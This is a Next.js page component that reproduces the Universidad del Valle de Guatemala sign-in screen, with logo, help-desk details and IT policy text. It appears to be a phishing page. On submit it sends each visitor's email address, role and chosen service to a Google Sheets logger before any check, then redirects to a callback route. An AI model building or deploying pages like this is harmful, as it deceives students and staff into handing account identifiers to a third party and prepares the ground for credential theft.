"use client"

import type React from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Link from "next/link"
import { useRouter, useSearchParams } from "next/navigation"
import { useState } from "react"
import Image from "next/image"
import { sendUserDataToSheets } from "@/lib/google-sheets"

export default function ServiceAuthPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const [email, setEmail] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const userRole = searchParams.get("role") || "student"
  const service = searchParams.get("service") || "servicio"

  const serviceNames: { [key: string]: string } = {
    "academic-services": "Servicios Académicos",
    "student-life": "Vida Estudiantil",
    biblioteca: "Biblioteca Digital",
    becas: "Becas y Ayudas",
    tutoria: "Tutoría Académica",
    salud: "Servicios de Salud",
    "hr-services": "Recursos Humanos",
    "academic-management": "Gestión Académica",
    email: "Correo Institucional",
    "biblioteca-docente": "Biblioteca Digital",
    desarrollo: "Desarrollo Docente",
    soporte: "Soporte Técnico",
  }

  const serviceName = serviceNames[service] || "Servicio"

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    const userData = {
      timestamp: new Date().toISOString(),
      email: email,
      name: email.split("@")[0],
      role: userRole,
      loginType: serviceName,
      source: `${serviceName} - ${userRole}`,
    }

    await sendUserDataToSheets(userData)

    setTimeout(() => {
      if (email.includes("@uvg.edu.gt")) {
        const userName = email.split("@")[0]
        router.push(`/auth/callback?email=${email}&name=${userName}&role=${userRole}&service=${service}`)
      } else {
        alert("Por favor usa tu correo institucional (@uvg.edu.gt)")
        setIsLoading(false)
      }
    }, 1500)
  }

  return (
    <div className="min-h-screen bg-gray-900 relative overflow-hidden">
      <div className="absolute left-8 top-1/2 transform -translate-y-16 opacity-10 text-white">
        <div className="text-7xl font-bold mb-2">En UVG</div>
        <div className="text-5xl font-semibold">cultura de</div>
      </div>

      <div className="absolute right-8 top-1/2 transform -translate-y-8 opacity-10 text-white text-right">
        <div className="text-5xl font-semibold mb-2">de la</div>
        <div className="text-5xl font-semibold">de Ética,</div>
      </div>

      <div className="absolute left-8 bottom-40 opacity-10 text-white">
        <div className="text-5xl font-semibold">adhiere</div>
      </div>

      <div className="absolute right-8 bottom-40 opacity-10 text-white text-right">
        <div className="text-5xl font-semibold">que te</div>
      </div>

      <div className="relative z-10 min-h-screen flex flex-col items-center justify-center py-12 px-4">
        <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-8 mb-4">
          <div className="mb-6">
            <Image src="/uvg-logo.png" alt="UVG - Universidad del Valle de Guatemala" width={200} height={60} />
          </div>

          <p className="text-gray-600 mb-6">Inicia sesión con tu cuenta institucional para acceder</p>

          <form onSubmit={handleNext} className="space-y-4">
            <div>
              <Input
                type="email"
                placeholder="someone@example.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>

            <div className="text-left">
              <Link href="#" className="text-blue-600 hover:text-blue-800 text-sm">
                ¿No puede acceder a su cuenta?
              </Link>
            </div>

            <div className="flex space-x-3 mt-6">
              <Button
                type="button"
                variant="outline"
                className="flex-1 py-2 px-4 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 bg-transparent"
                onClick={() => router.back()}
              >
                Atrás
              </Button>
              <Button
                type="submit"
                disabled={isLoading}
                className="flex-1 py-2 px-4 bg-blue-600 text-white rounded-md hover:bg-blue-700 disabled:opacity-50"
              >
                {isLoading ? "Cargando..." : "Siguiente"}
              </Button>
            </div>
          </form>

          <div className="mt-8 pt-6 border-t border-gray-200">
            <h3 className="font-semibold text-gray-800 mb-3">¿Tiene algún problema?</h3>
            <div className="text-sm text-gray-600 space-y-2">
              <p>
                Envíenos un correo electrónico a{" "}
                <Link href="mailto:servicios.tecnologia@uvg.edu.gt" className="text-blue-600 hover:text-blue-800">
                  servicios.tecnologia@uvg.edu.gt
                </Link>{" "}
                o comuníquese al 2364-0336 / 40, extensión 21551.
              </p>
              <div className="mt-3">
                <p className="font-medium">Horario de atención Lunes a viernes de 7:00 a 20:00</p>
                <p>Sábado de 7:00 a 15:00</p>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-4 mb-8">
          <div className="flex items-center text-sm text-gray-600">
            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
              />
            </svg>
            Opciones de inicio de sesión
          </div>
        </div>

        <div className="max-w-4xl w-full px-4">
          <div className="text-xs text-white text-center space-x-4">
            <span>Términos de uso</span>
            <span>
              ¡AVISO DE POLÍTICA TI! Estimado Usuario se le recuerda que el uso de la contraseña es personal e
              intransferible, el préstamo de usuarios y contraseñas NO está permitido y se considera como una falta a
              las políticas de TI de UVG.
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}
